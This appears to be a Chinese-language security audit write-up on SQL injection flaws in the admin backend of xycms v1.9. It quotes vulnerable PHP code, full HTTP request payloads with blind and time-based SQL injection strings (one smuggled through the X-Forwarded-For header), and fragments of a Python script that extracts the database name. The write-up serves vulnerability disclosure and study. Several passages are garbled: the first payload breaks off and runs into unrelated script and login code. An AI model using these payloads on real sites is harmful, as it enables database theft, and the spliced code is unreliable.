记一次xycms v1.9的审计，文章有写的不好的地方，大佬们轻喷。
# 网站目录结构
    ├── Conf（连接数据库的一些配置文件）
    ├── Libs（一些公共函数）
    ├── Statics（js的一些静态文件）
    ├── Style（css样式）
    ├── add_book.php
    ├── add_do.php
    ├── code.php
    ├── foot.php
    ├── index.php
    ├── install（网站安装目录）
    ├── system（网站后台，审计的重点）
    └── top.php
# 后台SQL注入漏洞
## 第一处sql注入
`/system/add_book_class.php`，关键代码如下，这里没有任何的过滤
    ......
    ......
    ......
     $_POST['title'],
            'c_order' => $_POST['c_order']
            );
        $db->insert("****cms_book_class", $siteinfo);
        //$db->close();
        echo "";
    }
    ?>
insert函数在`/Libs/Class/mysql.class.php`，内容如下，这里也并没有对插入数据库的函数进行过滤
    function insert($tableName, $column = array()) {
             $columnName = "";
             $columnValue = "";
             foreach ($column as $key => $value) {
                 $columnName .= $key . ",";
                 $columnValue .= "'" . $value . "',";
             }
             $columnName = substr($columnName, 0, strlen($columnName) - 1);
             $columnValue = substr($columnValue, 0, strlen($columnValue) - 1);
             $sql = "INSERT INTO $tableName($columnName) VALUES($columnValue)";
             $this->query($sql);
         }
payload：
    POST /system/add_book_class.php?act=ok HTTP/1.1
    Host: localhost:81
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 93
    Origin: http://localhost:81
    Connection: close
    Referer: http://localhost:81/system/add_book_class.php
    Cookie: PHPSESSID=npvaign44srcvlhjglh9srrqo6
    Upgrade-Insecure-Requests: 1
    title=',case when (ascii(mid((database()),1,1)) 2.5:
                    right = mid
                else:
                    left = mid
        return name
    # 这里爆破库名长度
    # 5
    database_length_payload = "',case when (ascii(mid((length(database())),{num1},1))query($sql);
    if(!mysql_num_rows($result)==0){
        $_SESSION["m_name"] = $m_name;
        $db->query("UPDATE admin_user SET login_nums=login_nums+1 where u_name='".$m_name."'");
        $login_info=array(
           'u_name'=>$m_name,
           'login_date'=>strtotime(date('Y-m-d')),
           'login_ip'=>$login_ip
        );
        $db->insert("admin_login_log",$login_info);
        $db->close();
        ok_info('***cms.php','恭喜您，登陆成功!');
      }
    ......
    ......
    ......
`getIp()`函数如下
    function getIp() {
        if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
            $ip = getenv("HTTP_CLIENT_IP");
        else
            if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
                $ip = getenv("HTTP_X_FORWARDED_FOR");
            else
                if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
                    $ip = getenv("REMOTE_ADDR");
                else
                    if (isset ($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
                        $ip = $_SERVER['REMOTE_ADDR'];
                    else
                        $ip = "unknown";
        return ($ip);
    }
这里对ip没有做任何的过滤限制，我们可以用http头`X-Forwarded-For`，对输入的ip进行控制，也就是说，`loginpass.php`中的变量`$login_ip`是可控的
`insert`函数如下
    function insert($tableName, $column = array()) {
             $columnName = "";
             $columnValue = "";
             foreach ($column as $key => $value) {
                 $columnName .= $key . ",";
                 $columnValue .= "'" . $value . "',";
             }
             $columnName = substr($columnName, 0, strlen($columnName) - 1);
             $columnValue = substr($columnValue, 0, strlen($columnValue) - 1);
             $sql = "INSERT INTO $tableName($columnName) VALUES($columnValue)";
             $this->query($sql);
         }
这里对插入的数据也没有做任何限制
payload如下
    POST /system/loginpass.php HTTP/1.1
    Host: localhost:81
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 33
    Origin: http://localhost:81
    Connection: close
    Referer: http://localhost:81/system/index.php
    Cookie: PHPSESSID=npvaign44srcvlhjglh9srrqo6
    Upgrade-Insecure-Requests: 1
    X-Forwarded-For: 1' and case when (ascii(mid((database()),1,1))<127) then (sleep(5)) else (1) end and '
    admin=1&password=1&checkcode=4K23
也就是说，我们只要能正确识别验证码，`X-Forwarded-For`中提交盲注的内容，就可以进行sql注入
注入数据库名的`exp.py`